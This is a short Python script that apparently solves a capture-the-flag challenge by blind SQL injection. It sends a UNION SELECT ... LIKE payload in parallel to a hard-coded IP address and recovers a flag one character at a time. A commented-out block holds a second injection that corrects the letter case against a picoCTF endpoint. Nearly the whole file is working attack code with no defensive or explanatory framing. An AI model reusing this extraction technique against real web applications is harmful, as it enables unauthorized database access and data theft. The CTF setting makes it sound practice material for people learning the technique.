#!/usr/bin/env python3
import requests
import string
import multiprocessing as mp

CHAR_LIST = (string.printable
                .replace(' ', '')
                .replace('\'', '')
                .replace('"', ''))


payload = "2' and 0=1 UNION SELECT flag, NULL FROM flag WHERE flag LIKE 'TEXT%' COLLATE BINARY;;--"

answer = 'HATS{'
answer = 'HATS{yo'

def query(guess):
    r = requests.get("http://157.245.202.4:1355",
        params={
            'q': payload.replace('TEXT', guess),
            'submit': 'Submit'
        }
    )

    return (guess, r.text)


# while len(answer) < 100:
while '}' not in answer:
    print(f"Progress: {answer} [{len(answer)}]")


    guesses = []
    for ch in CHAR_LIST:
        # % and _ are used as wildcards in SQLite.
        # escape them
        ch = ch.replace('%', '\\%') 
        # ch = ch.replace('_', '\\_')

        guess = answer + ch
        guesses.append(guess)

    # Call miltithreaded query(guess) for guess in guesses
    with mp.Pool(processes=100) as pool:
        results = pool.map(query, guesses)

    for result in results:
        guess, rtext = result
        # if successful return
        if 'Wakanda' in rtext:
            answer = guess
            print("Success:", answer)
            break


'''
# Check capital
answer = list(answer)
check_caps = "' or substr(answer, 3, 1) <> lower(substr(answer, 3, 1)) ;--"


for index in range(len(answer)):
    print(f"Progress: {answer} [Checking {index}]")

    # sql substr() is 1-indexed
    sql_index = str(index + 1)
    r = requests.post("http://2018shell2.picoctf.com:28120/answer2.php", 
        data= {
            'answer': check_caps.replace('3', sql_index),
            'debug': '0',
        }
    )

    if 'You are so close' in r.text:
        # case is not equal, swap it
        answer[index] = answer[index].upper()

print("Success:", ''.join(answer))

'''
